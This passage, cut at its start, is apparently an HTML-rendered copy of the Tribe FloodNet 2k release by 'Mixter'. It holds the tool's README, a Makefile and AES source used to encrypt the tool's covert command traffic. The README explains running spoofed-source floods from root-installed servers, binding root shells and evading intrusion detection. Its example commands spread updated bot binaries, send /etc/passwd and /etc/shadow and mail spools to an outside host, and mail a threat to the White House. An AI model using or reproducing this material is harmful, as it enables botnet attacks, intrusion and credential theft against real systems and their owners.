<br><font color="#FF0000">are out, currently being improved drastically,
kept PRIVATE, and some of them</font>
<br><font color="#FF0000">not with the somewhat predictable functionality
of Denial Of Service. It is</font>
<br><font color="#FF0000">time for everyone to wake up, and realize the
worst scenario that could happen</font>
<br><font color="#FF0000">to him if he does not care enough about security
issues.</font>
<br><font color="#FF0000">Therefore, this program is also designed to compile
on a maximum number of</font>
<br><font color="#FF0000">various operating systems, to show that almost
no modern operating system is</font>
<br><font color="#FF0000">specifically secure, including Windows, Solaris,
most UNIX flavors and Linux.</font>
<p><font color="#FF0000">Feature description</font>
<p><font color="#FF0000">Using distributed client/server functionality,
stealth and encryption</font>
<br><font color="#FF0000">techniques and a variety of functions, TFN can
be used to control any</font>
<br><font color="#FF0000">number of remote machines to generate on-demand,
anonymous Denial Of</font>
<br><font color="#FF0000">Service attacks and remote shell access. The
new and improved features in</font>
<br><font color="#FF0000">this version include:</font>
<p><font color="#FF0000">Functionality additions:</font>
<br><font color="#FF0000">* Remote one-way command execution for distributed
execution control</font>
<br><font color="#FF0000">* Mix attack aimed at weak routers</font>
<br><font color="#FF0000">* Targa3 attack aimed at systems with IP stack
vulnerabilities</font>
<br><font color="#FF0000">* Compatibility to many UNIX systems and Windows
NT</font>
<p><font color="#FF0000">Anonymous stealth client/server communication
using:</font>
<br><font color="#FF0000">* spoofed source addresses</font>
<br><font color="#FF0000">* strong advanced encryption</font>
<br><font color="#FF0000">* one-way communication protocol</font>
<br><font color="#FF0000">* messaging via random IP protocol</font>
<br><font color="#FF0000">* decoy packets</font>
<p><font color="#FF0000">Compilation</font>
<p><font color="#FF0000">You have to agree to the disclaimer in order to
compile TFN.</font>
<br><font color="#FF0000">Before you compile, make sure to edit src/Makefile
and uncomment the options</font>
<br><font color="#FF0000">for your operating system. You are advised to
take a look at src/config.h and</font>
<br><font color="#FF0000">edit it to change some important default values.</font>
<br><font color="#FF0000">Once you start compiling, you will be prompted
for a server password that can</font>
<br><font color="#FF0000">be 8 to 32 characters long. If you compile with
REQUIRE_PASS, you will need</font>
<br><font color="#FF0000">to remember and type in this password in order
to use the client.</font>
<p><font color="#FF0000">Installation</font>
<p><font color="#FF0000">The TFN server is installed on a host running
as root (or euid root).</font>
<br><font color="#FF0000">It will not commit changes of system configuration
in any way itself,</font>
<br><font color="#FF0000">so you would have to make it restarting after
system reboots.</font>
<br><font color="#FF0000">Once the server is installed, you can add the
hostname to your list</font>
<br><font color="#FF0000">of ready servers (but you can contact single
servers as well).</font>
<br><font color="#FF0000">The TFN client can be run from most (root) shells
and windows command</font>
<br><font color="#FF0000">line (with Administrator privileges needed on
NT).</font>
<p><font color="#FF0000">Using the client</font>
<p><font color="#FF0000">The client, tfn, is used to contact the servers,
which then will</font>
<br><font color="#FF0000">change their configuration, spawn a shell, or
control flood against</font>
<br><font color="#FF0000">a multiple number of victim hosts. You can either
read the servers</font>
<br><font color="#FF0000">hosts from a file containing the hostnames: tfn
-f file</font>
<br><font color="#FF0000">or you can contact one server at a time: tfn
-h hostname</font>
<br><font color="#FF0000">The default command issued is to stop flooding
by killing all</font>
<br><font color="#FF0000">child threads on the server hosts. Commands can
generally be issued</font>
<br><font color="#FF0000">with -c &lt;id>. See TFN command line and descriptions
below.</font>
<br><font color="#FF0000">The option -i is needed to give option values
to commands, and to</font>
<br><font color="#FF0000">parse the string of target hosts, which consists
of all victim hosts,</font>
<br><font color="#FF0000">separated by a delimiter character, which is
@ by default. When using</font>
<br><font color="#FF0000">smurf flood, only the first target is a victim
and the following ones</font>
<br><font color="#FF0000">are used as directed broadcast flood amplifier
addresses.</font>
<p><font color="#FF0000">ID 1 - Anti Spoof Level: The DoS attack commenced
by the servers will</font>
<br><font color="#FF0000">&nbsp;always emanate from spoofed source IP addresses.
With this command,</font>
<br><font color="#FF0000">&nbsp;you can control which part of the IP address
will be spoofed, and</font>
<br><font color="#FF0000">&nbsp;which part will contain real bits of the
actual IP.</font>
<br><font color="#FF0000">ID 2 - Change Packet Size: The default ICMP/8,
SMURF, and UDP attacks</font>
<br><font color="#FF0000">&nbsp;use packets of a minimal size by default.
You can increase this size</font>
<br><font color="#FF0000">&nbsp;by changing the payload size of each packet
in bytes.</font>
<br><font color="#FF0000">ID 3 - Bind root shell: Starts a one-session
server that drops you</font>
<br><font color="#FF0000">&nbsp;to a root shell when you connect to the
specified port.</font>
<br><font color="#FF0000">ID 4 - UDP flood attack. This attack can be used
to exploit the fact</font>
<br><font color="#FF0000">&nbsp;that for every udp packet sent to a closed
port, there will be an</font>
<br><font color="#FF0000">&nbsp;ICMP unreachable message sent back, multiplying
the attacks potential.</font>
<br><font color="#FF0000">ID 5 - SYN flood attack. This attack steadily
sends bogus connection</font>
<br><font color="#FF0000">&nbsp;requests. Possible effects include denial
of service on one or more</font>
<br><font color="#FF0000">&nbsp;targeted ports, filled up TCP connection
tables and attack potential</font>
<br><font color="#FF0000">&nbsp;multiplication by TCP/RST responses to
non-existent hosts.</font>
<br><font color="#FF0000">ID 6 - ICMP echo reply (ping) attack. This attack
sends ping requests</font>
<br><font color="#FF0000">&nbsp;from bogus source IPs, to which the victim
replies with equally large</font>
<br><font color="#FF0000">&nbsp;response packets.</font>
<br><font color="#FF0000">ID 7 - SMURF attack. Sends out ping requests
with the source address</font>
<br><font color="#FF0000">&nbsp;of the victim to broadcast amplifiers,
hosts that reply with a</font>
<br><font color="#FF0000">&nbsp;drastically multiplied bandwidth back to
the source.</font>
<br><font color="#FF0000">ID 8 - MIX attack. This sends UDP, SYN and ICMP
packets interchanged</font>
<br><font color="#FF0000">&nbsp;on a 1:1:1 relation, which can specifically
be hazard to routers and</font>
<br><font color="#FF0000">&nbsp;other packet forwarding devices or NIDS
and sniffers.</font>
<br><font color="#FF0000">ID 9 - TARGA3 attack. Uses random packets with
IP based protocols and</font>
<br><font color="#FF0000">&nbsp;values that are known to be critical or
bogus, and can cause some IP</font>
<br><font color="#FF0000">&nbsp;stack implementations to crash, fail, or
show other undefined behavior.</font>
<br><font color="#FF0000">ID 10 - Remote command execution. Gives the opportunity
of one-way</font>
<br><font color="#FF0000">&nbsp;mass executing remote shell commands on
the servers. See sub section</font>
<br><font color="#FF0000">&nbsp;4.1 on further usage of this function.</font>
<br><font color="#FF0000">For further information on the options, see also
the command line help.</font>
<p><font color="#FF0000">Using TFN for other distributed tasks</font>
<p><font color="#FF0000">According to the CERT advisory, recent versions
of distributed attack</font>
<br><font color="#FF0000">tools also include a new popular feature: self-updating
software.</font>
<br><font color="#FF0000">While I didn't explicitly include this function,
it is basically possible</font>
<br><font color="#FF0000">to do with TFN. Command #10, remote command execution,
gives the TFN</font>
<br><font color="#FF0000">user the ability of executing the same shell
commands in "batch" mode on</font>
<br><font color="#FF0000">any number of remote hosts. This should be regarded
as a tiny demonstration</font>
<br><font color="#FF0000">that distributed network tools are capable of
virtually anything, beyond</font>
<br><font color="#FF0000">such relatively simple things as Denial Of Service
attacks.</font>
<p><font color="#FF0000">Following are some fun but thoroughly evil examples:</font>
<br><font color="#FF0000">(These are EXAMPLES, not suggestions.. just in
case you plan on suing me =P)</font>
<p><font color="#FF0000">Remotely self-updating TFN servers:</font>
<br><font color="#FF0000">&nbsp;Set up an account "user" at sample.edu
for world access by putting</font>
<br><font color="#FF0000">&nbsp;"+ +" into "~/.rhosts". Place "tfn3000"
into /tmp, and issue the command:</font>
<br><font color="#FF0000">&nbsp;tfn -f hosts.txt -c10 -i "( rcp user@sample.edu:/tmp/tfn3000
/tmp/tfn3000\</font>
<br><font color="#FF0000">&nbsp;&amp;&amp; killall -9 td &amp;&amp; mv
-f /tmp/tfn3000 /etc/owned/td &amp;&amp; /etc/owned/td ) &amp;"</font>
<br><font color="#FF0000">Fetch password files:</font>
<br><font color="#FF0000">&nbsp;On your local host, type: while :; do 'nc
-l -p 666 >> passwds' ; done</font>
<br><font color="#FF0000">&nbsp;Now issue the command: tfn -f hosts.txt
-c10 -i "( hostname ; ypcat \</font>
<br><font color="#FF0000">&nbsp;passwd || cat /etc/passwd /etc/shadow )
| telnet intruders.org 666"</font>
<br><font color="#FF0000">Fun with Network Intrusion Detection:</font>
<br><font color="#FF0000">&nbsp;tfn -f hosts.txt -c10 -i "echo 'GET /cgi-bin/phf?Qname=x%0A/bin/something\</font>
<br><font color="#FF0000">&nbsp;%20is%20wrong%20with%20your%20IDS' | telnet
www.security-corporation.com 80"</font>
<br><font color="#FF0000">Fun with e-mail:</font>
<br><font color="#FF0000">&nbsp;tfn -f hosts.txt -c10 -i "cat ~mail/* |
gzip -c | uuencode -m surprise.gz \</font>
<br><font color="#FF0000">&nbsp;| mail -s surprise root@intruders.org"
or</font>
<br><font color="#FF0000">&nbsp;tfn -f hosts.txt -c10 -i "echo better take
care, people could accidentally\</font>
<br><font color="#FF0000">&nbsp;shoot you | mail -s 'a word of warning'
president@whitehouse.gov"</font>
<p><font color="#FF0000">Just a few of the possibilities, use your imagination...
if nothing else</font>
<br><font color="#FF0000">gets people to secure their networks, maybe these
perspectives will. O:)</font>
<p><font color="#FF0000">Technology description</font>
<p><font color="#FF0000">TFN consists of a client and an unlimited number
of servers that are</font>
<br><font color="#FF0000">each installed on different hosts. Each one of
these servers is</font>
<br><font color="#FF0000">utilized to commence floods with spoofed source
IPs.</font>
<br><font color="#FF0000">Communication between client and server is realized
using a randomly</font>
<br><font color="#FF0000">chosen protocol, TCP, UDP or ICMP, with internal
values optimized so</font>
<br><font color="#FF0000">that no recognizable pattern can be found in
client/server communication</font>
<br><font color="#FF0000">and that the packets easily pass through most
filtering mechanisms.</font>
<br><font color="#FF0000">The actual Tribe Protocol (tm) is contained in
the packet payload.</font>
<br><font color="#FF0000">It is CAST-256 encrypted and base64 encoded,
and is decoded by the</font>
<br><font color="#FF0000">TFN servers in first place. The payload then
consists of the header,</font>
<br><font color="#FF0000">which is the command ID surrounded by two equal
characters, and</font>
<br><font color="#FF0000">followed by the target or option string.</font>
<br><font color="#FF0000">The clients source IP address is generally spoofed,
but a custom IP</font>
<br><font color="#FF0000">may be used for purposes like evasion of rfc2267
ingress/egress</font>
<br><font color="#FF0000">filtering, as well as a custom protocol.</font>
<br><font color="#FF0000">Additionally, any amount of decoy packets can
optionally be sent out</font>
<br><font color="#FF0000">with every real packet, in order to obscure the
real servers locations,</font>
<br><font color="#FF0000">thereby completely obscuring the client/server
communication.</font>
<p><font color="#FF0000">Conclusions and Acknowledgements</font>
<p><font color="#FF0000">If any conclusion can be made, then it is that
you cannot reliably trust</font>
<br><font color="#FF0000">pattern or attack signature matching when it
comes to providing systematic,</font>
<br><font color="#FF0000">real, security. This includes network and host
based intrusion detection</font>
<br><font color="#FF0000">(no typical default strings can be found in the
server executable.. oh and</font>
<br><font color="#FF0000">by the way, even if it could be detected, there
are public programs that</font>
<br><font color="#FF0000">convert ELF binaries to self-extracting compressed
executables...).</font>
<br><font color="#FF0000">Examine the TFN server closely, look at the resources
it uses, try netstat</font>
<br><font color="#FF0000">or strace, and you will find that it looks very
harmless. Imagine binaries</font>
<br><font color="#FF0000">like these installed on your systems, and conclude,
that only systematic and</font>
<br><font color="#FF0000">consequent security efforts can ensure you a
secure environment.</font>
<br><font color="#FF0000">Shouts to phifli and random, other authors of
distributed DoS, so1o /</font>
<br><font color="#FF0000">Code Zero for their ICMP tunneling code, Steven
K., David Brumley and</font>
<br><font color="#FF0000">Dave Dittrich who analyzed distributed attack
tools in the first place.</font>
<p><font color="#FF0000">For more information on distributed attack tools
and security, see:</font>
<p><font color="#FF0000">* distributed attack tool collection</font>
<br><font color="#FF0000">http://packetstorm.securify.com/distributed</font>
<p><font color="#FF0000">* distributed attack tools CERT advisory</font>
<br><font color="#FF0000">http://www.cert.org/incident_notes/IN-99-07.html</font>
<p><font color="#FF0000">* tools and other publications from me</font>
<br><font color="#FF0000">http://mixter.void.ru</font>
<br>&nbsp;
<p><font color="#FF0000">Mixter</font>
<br>
<hr WIDTH="100%">
<center><font color="#3333FF"><font size=+1>MAKEFILE</font></font></center>

<p><font color="#3333FF"># Tribe FloodNet - 2k edition</font>
<br><font color="#3333FF"># by Mixter &lt;mixter@newyorkoffice.com></font>
<p><font color="#3333FF">all:</font>
<br><font color="#3333FF">&nbsp;cd src &amp;&amp; make</font>
<br><font color="#3333FF">&nbsp;cp src/td src/tfn .</font>
<br>
<hr WIDTH="100%">
<center><font color="#FF0000"><font size=+1>aes.c</font></font></center>

<p><font color="#FF0000">/* AES CryptAPI - implementation of AES functions
for&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *</font>
<br><font color="#FF0000">&nbsp;* character buffer / binary / text encryption.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
*</font>
<br><font color="#FF0000">&nbsp;* Written Nov 99 by Mixter &lt;mixter@newyorkoffice.com>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
*/</font>
<p><font color="#FF0000">#include "aes.h"</font>
<p><font color="#FF0000">u4byte *</font>
<br><font color="#FF0000">aes_setkey (char *password)</font>
<br><font color="#FF0000">{</font>
<br><font color="#FF0000">&nbsp; u4byte keylen = strlen (password) * 8;</font>
<br><font color="#FF0000">&nbsp; u4byte key[strlen (password) / 4];</font>
<br><font color="#FF0000">&nbsp; memcpy (key, password, strlen (password));</font>
<br><font color="#FF0000">&nbsp; return (set_key (key, keylen));</font>
<br><font color="#FF0000">}</font>
<p><font color="#FF0000">u1byte *</font>
<br><font color="#FF0000">encode (u1byte * inbuf, int len)</font>
<br><font color="#FF0000">{</font>
<br><font color="#FF0000">&nbsp; u4byte i, in_blk[4], out_blk[4];</font>
<p><font color="#FF0000">&nbsp; if (len % 16 != 0)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; len += 16 - (len % 16);</font>
<p><font color="#FF0000">&nbsp; for (i = 0; i &lt; len - 15; i += 16)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memcpy (in_blk,
inbuf + i, 16);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; aes_encrypt (in_blk,
out_blk);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memcpy (inbuf
+ i, out_blk, 16);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<p><font color="#FF0000">&nbsp; return inbuf;</font>
<br><font color="#FF0000">}</font>
<p><font color="#FF0000">u1byte *</font>
<br><font color="#FF0000">decode (u1byte * inbuf, int len)</font>
<br><font color="#FF0000">{</font>
<br><font color="#FF0000">&nbsp; u4byte i, in_blk[4], out_blk[4];</font>
<p><font color="#FF0000">&nbsp; if (len % 16 != 0)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; len += 16 - (len % 16);</font>
<p><font color="#FF0000">&nbsp; for (i = 0; i &lt; len - 15; i += 16)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memcpy (in_blk,
inbuf + i, 16);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; decrypt (in_blk,
out_blk);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memcpy (inbuf
+ i, out_blk, 16);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<p><font color="#FF0000">&nbsp; return inbuf;</font>
<br><font color="#FF0000">}</font>
<p><font color="#FF0000">u1byte *</font>
<br><font color="#FF0000">encode64 (u1byte * inbuf, u1byte * outbuf, int
len)</font>
<br><font color="#FF0000">{</font>
<br><font color="#FF0000">&nbsp; if (!len)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; return inbuf;</font>
<br><font color="#FF0000">&nbsp; encode (inbuf, len);</font>
<br><font color="#FF0000">&nbsp; base64_in (inbuf, (char *) outbuf, len
+ 16);</font>
<br><font color="#FF0000">&nbsp; return outbuf;</font>
<br><font color="#FF0000">}</font>
<p><font color="#FF0000">u1byte *</font>
<br><font color="#FF0000">decode64 (u1byte * inbuf, u1byte * outbuf, int
len)</font>
<br><font color="#FF0000">{</font>
<br><font color="#FF0000">&nbsp; if (!len)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; return inbuf;</font>
<br><font color="#FF0000">&nbsp; base64_out ((char *) inbuf, outbuf, len);</font>
<br><font color="#FF0000">&nbsp; decode (outbuf, len);</font>
<br><font color="#FF0000">&nbsp; return outbuf;</font>
<br><font color="#FF0000">}</font>
<br>
<hr WIDTH="100%">
<center><font color="#3333FF"><font size=+1>aes.h</font></font></center>

<p><font color="#3333FF">/* AES CryptAPI - interface to use AES algorithms
for&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *</font>
<br><font color="#3333FF">&nbsp;* character buffer / binary / text encryption.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
*</font>
<br><font color="#3333FF">&nbsp;* Written Nov 99 by Mixter &lt;mixter@newyorkoffice.com>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
*</font>
<br><font color="#3333FF">&nbsp;* and based on the NIST standard definitions
for&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *</font>
<br><font color="#3333FF">&nbsp;* AES cryptography source code.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
*/</font>
<p><font color="#3333FF">#ifndef _AES_H</font>
<br><font color="#3333FF">#define _AES_H</font>
<p><font color="#3333FF">void base64_in (unsigned char *, char *, int);</font>
<br><font color="#3333FF">void base64_out (char *, unsigned char *, int);</font>
<p><font color="#3333FF">typedef unsigned char u1byte; /* an 8 bit unsigned
character type */</font>
<br><font color="#3333FF">typedef unsigned short u2byte; /* a 16 bit unsigned
integer type&nbsp;&nbsp; */</font>
<br><font color="#3333FF">typedef unsigned long u4byte; /* a 32 bit unsigned
integer type&nbsp;&nbsp; */</font>
<br><font color="#3333FF">typedef signed char s1byte; /* an 8 bit signed
character type&nbsp;&nbsp; */</font>
<br><font color="#3333FF">typedef signed short s2byte; /* a 16 bit signed
integer type&nbsp;&nbsp;&nbsp;&nbsp; */</font>
<br><font color="#3333FF">typedef signed long s4byte; /* a 32 bit signed
integer type&nbsp;&nbsp;&nbsp;&nbsp; */</font>
<p><font color="#3333FF">#ifdef&nbsp; __cplusplus</font>
<br><font color="#3333FF">extern "C"</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp; u4byte *aes_setkey (char *password);</font>
<br><font color="#3333FF">&nbsp; u1byte *encode (u1byte * inbuf, int len);</font>
<br><font color="#3333FF">&nbsp; u1byte *decode (u1byte * inbuf, int len);</font>
<br><font color="#3333FF">&nbsp; u1byte *encode64 (u1byte * inbuf, u1byte
* outbuf, int len);</font>
<br><font color="#3333FF">&nbsp; u1byte *decode64 (u1byte * inbuf, u1byte
* outbuf, int len);</font>
<br><font color="#3333FF">&nbsp; char **cipher_name (void);</font>
<br><font color="#3333FF">&nbsp; u4byte *set_key (const u4byte in_key[],
const u4byte key_len);</font>
<br><font color="#3333FF">&nbsp; void aes_encrypt (const u4byte in_blk[4],
u4byte out_blk[4]);</font>
<br><font color="#3333FF">&nbsp; void decrypt (const u4byte in_blk[4],
u4byte out_blk[4]);</font>
<br><font color="#3333FF">};</font>
<br><font color="#3333FF">#else</font>
<br><font color="#3333FF">u4byte *aes_setkey (char *password);</font>
<br><font color="#3333FF">u1byte *encode (u1byte * inbuf, int len);</font>
<br><font color="#3333FF">u1byte *decode (u1byte * inbuf, int len);</font>
<br><font color="#3333FF">u1byte *encode64 (u1byte * inbuf, u1byte * outbuf,
int len);</font>
<br><font color="#3333FF">u1byte *decode64 (u1byte * inbuf, u1byte * outbuf,
int len);</font>
<br><font color="#3333FF">char **cipher_name (void);</font>
<br><font color="#3333FF">u4byte *set_key (const u4byte in_key[], const
u4byte key_len);</font>
<br><font color="#3333FF">void aes_encrypt (const u4byte in_blk[4], u4byte
out_blk[4]);</font>
<br><font color="#3333FF">void decrypt (const u4byte in_blk[4], u4byte
out_blk[4]);</font>
<br><font color="#3333FF">#endif</font>
<p><font color="#3333FF">#ifndef _MSC_VER</font>
<br><font color="#3333FF">#define rotr(x,n)&nbsp;&nbsp; (((x) >> ((int)(n)))
| ((x) &lt;&lt; (32 - (int)(n))))</font>
<br><font color="#3333FF">#define rotl(x,n)&nbsp;&nbsp; (((x) &lt;&lt;
((int)(n))) | ((x) >> (32 - (int)(n))))</font>
<br><font color="#3333FF">#else</font>
<br><font color="#3333FF">#include &lt;stdlib.h></font>
<br><font color="#3333FF">#pragma intrinsic(_lrotr,_lrotl)</font>
<br><font color="#3333FF">#define rotr(x,n)&nbsp;&nbsp; _lrotr(x,n)</font>
<br><font color="#3333FF">#define rotl(x,n)&nbsp;&nbsp; _lrotl(x,n)</font>
<br><font color="#3333FF">#endif</font>
<br><font color="#3333FF">#define bswap(x)&nbsp;&nbsp;&nbsp; ((rotl(x,
8) &amp; 0x00ff00ff) | (rotr(x, 8) &amp; 0xff00ff00))</font>
<br><font color="#3333FF">#define byte(x,n)&nbsp;&nbsp; ((u1byte)((x) >>
(8 * n)))</font>
<br><font color="#3333FF">#ifdef&nbsp; BYTE_SWAP</font>
<br><font color="#3333FF">#define io_swap(x)&nbsp; bswap(x)</font>
<br><font color="#3333FF">#else</font>
<br><font color="#3333FF">#define io_swap(x)&nbsp; (x)</font>
<br><font color="#3333FF">#endif</font>
<br><font color="#3333FF">#ifdef&nbsp; WORD_SWAP</font>
<br><font color="#3333FF">#define get_block(x)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[0] = io_swap(in_blk[3]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[1] = io_swap(in_blk[2]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[2] = io_swap(in_blk[1]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[3] = io_swap(in_blk[0])</font>
<br><font color="#3333FF">#define put_block(x)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; out_blk[3] = io_swap(((u4byte*)(x))[0]);&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; out_blk[2] = io_swap(((u4byte*)(x))[1]);&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; out_blk[1] = io_swap(((u4byte*)(x))[2]);&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; out_blk[0] = io_swap(((u4byte*)(x))[3])</font>
<br><font color="#3333FF">#define get_key(x,len)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[4] = ((u4byte*)(x))[5]
=&nbsp;&nbsp;&nbsp;&nbsp; \</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[6] = ((u4byte*)(x))[7]
= 0;&nbsp; \</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; switch((((len) + 63) / 64))
{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; case 2:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[0] = io_swap(in_key[3]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[1] = io_swap(in_key[2]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[2] = io_swap(in_key[1]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[3] = io_swap(in_key[0]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; break;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; case 3:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[0] = io_swap(in_key[5]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[1] = io_swap(in_key[4]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[2] = io_swap(in_key[3]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[3] = io_swap(in_key[2]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[4] = io_swap(in_key[1]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[5] = io_swap(in_key[0]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; break;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; case 4:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[0] = io_swap(in_key[7]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((u4byte*)(x))[1] = io_swap(in_key[6]);&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
